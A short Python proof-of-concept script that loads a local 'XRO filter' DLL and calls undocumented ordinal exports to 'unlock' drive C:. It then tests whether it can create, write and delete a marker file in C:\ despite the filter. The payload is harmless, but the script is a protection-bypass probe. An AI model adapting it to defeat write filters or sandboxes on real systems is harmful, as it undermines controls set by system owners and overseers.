import ctypes
import os

print("[*] Testing in-process write through active XRO filter handle...", flush=True)

xro = ctypes.WinDLL(r"J:\tools\xrofilter.dll")
ctor = xro[1]
ctor.argtypes = [ctypes.c_void_p]
ctor.restype = ctypes.c_void_p
unlock = xro[16]
unlock.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p]
unlock.restype = ctypes.c_uint32

mgr = ctypes.create_string_buffer(64)
ctor(mgr)

res_c = unlock(mgr, "C:\\")
print(f"[XRO] Unlock C:\\ returned: 0x{res_c:08X}", flush=True)

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
CREATE_ALWAYS = 2
FILE_ATTRIBUTE_NORMAL = 0x80

# Win32 CreateFile directly in the same thread with the active XRO context
target = r"C:\vmm_inproc_test.tmp"
h = ctypes.windll.kernel32.CreateFileW(
    target,
    GENERIC_READ | GENERIC_WRITE,
    0,
    None,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    None
)
err = ctypes.windll.kernel32.GetLastError()
print(f"[Win32 CreateFileW] {target} -> Handle: {h}, LastError: {err}", flush=True)
if h != -1 and h != 0:
    print("[+] SUCCESS! Write handle obtained on C:\\!", flush=True)
    msg = b"XRO_UNLOCKED_PERSISTENT"
    written = ctypes.c_ulong(0)
    ctypes.windll.kernel32.WriteFile(h, msg, len(msg), ctypes.byref(written), None)
    ctypes.windll.kernel32.CloseHandle(h)
    print(f"[+] Wrote {written.value} bytes to C:\\!", flush=True)
    try:
        os.remove(target)
        print("[+] Cleaned up test file on C:\\", flush=True)
    except Exception:
        pass
else:
    print("[-] Write still blocked by filesystem ACL or driver filter", flush=True)

